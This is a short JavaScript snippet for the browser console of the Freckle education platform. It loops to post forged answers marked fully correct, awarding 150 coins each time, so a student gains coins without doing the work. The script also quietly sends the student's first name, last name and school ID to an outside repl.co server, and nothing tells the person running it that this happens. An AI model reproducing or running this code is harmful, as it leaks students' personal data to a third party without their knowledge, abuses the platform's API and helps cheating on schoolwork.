



var r =await fetch("https://api.freckle.com/2/students/me", {
  method: "GET",
  credentials: "include"
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
g=await r.json()
console.log(g)
//42940076 https://api.freckle.com/2/students/me
async function coins(){
var id=document.getElementsByClassName("math-question__wrapper___iRtlD")[0]["dataset"]["questionId"]


var response= await fetch("https://api.freckle.com/3/subjects/math/products/targeted/sessions", {
  method: "POST",
  body: JSON.stringify({"studentIds":[g["id"]],"metadata":{"supportSetting":"none","questions":[{"questionId":id,"skillPair":{"skillId":"xpekuldo","subSkillId":null}}],"newOrRetry":{"tag":"new","contents":{"standardId":"lrwmctuu"}}}}),
  credentials: "include"
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
json=await response.json()
var idd=json[0]['id']
console.log(idd)
var id=document.getElementsByClassName("math-question__wrapper___iRtlD")[0]["dataset"]["questionId"]
var response= await fetch("https://api.freckle.com/3/subjects/math/products/targeted/sessions/"+idd+"/answers", {
  method: "POST",
  body: JSON.stringify({"answers":[{"questionId":id,"durationSeconds":11,"attempts":1,"correctness":100,"answer":{"kind":"singular_or","answer":"90"}}],"coinsGained":150})
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
  credentials: "include"
})

json=await response.json()
setTimeout(coins, 1);
}
dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" coins.js"
await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
  method: "GET",
  credentials: "include",
 mode: 'no-cors'       
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
coins();
